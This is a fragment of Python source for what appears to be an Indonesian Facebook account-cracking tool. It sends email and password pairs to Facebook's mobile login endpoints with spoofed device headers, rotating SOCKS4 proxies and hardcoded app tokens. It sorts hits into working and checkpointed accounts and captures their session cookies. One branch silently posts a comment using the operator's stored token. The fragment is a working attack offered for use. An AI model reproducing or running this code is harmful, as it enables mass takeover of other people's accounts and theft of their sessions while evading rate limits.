        header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.get('https://b-api.facebook.com/method/auth.login?', params=param, headers=header, proxies=proxy)
        else:
            post = r.get('https://b-api.facebook.com/method/auth.login?', params=param, headers=header)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

def logger5(user,pasw): #--- Login Graph FB ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":user,"password":pasw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
        headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.post("https://graph.facebook.com/auth/login",data=data,headers=headers,proxies=proxy)
        else:
            post = r.post("https://graph.facebook.com/auth/login",data=data,headers=headers)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

###----------[ CONVERT COOKIES ]---------- ###
def cvt3(denventa):
    try:cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(denventa['sb'],denventa['datr'],denventa['c_user'],denventa['xs'],denventa['fr']))
    except:cookie = 'denventagantengbanget'
    return(str(cookie))
def not_available(konten):
    print('')
    tamp_kesediaan = (f'   {P2}Mohon Maaf, Fitur {konten} Belum Tersedia Untuk Saat Ini. Tunggu Update Selanjutnya Untuk Menggunakan Fitur-Fitur Yang Akan Datang. Terima Kasih.\n\n                {M2}- Denventa -')
    printer(Panel(tamp_kesediaan,title=f'{M2}[  {P2}Coming  Soon  {M2}]',title_align='center',subtitle=f'{M2}[  {P2}See  You  {M2}]',subtitle_align='center',width=54,padding=(1,4),style='#FF0000'))
    input('\n\n               %s[ %sKembali Ke Menu Awal %s]              '%(H,P,H))
    tampilan_menu()

if __name__ == '__main__':
    resik()
    tampilan_menu()
print('%s[%s•%s] %s'%(J,P,J,P))
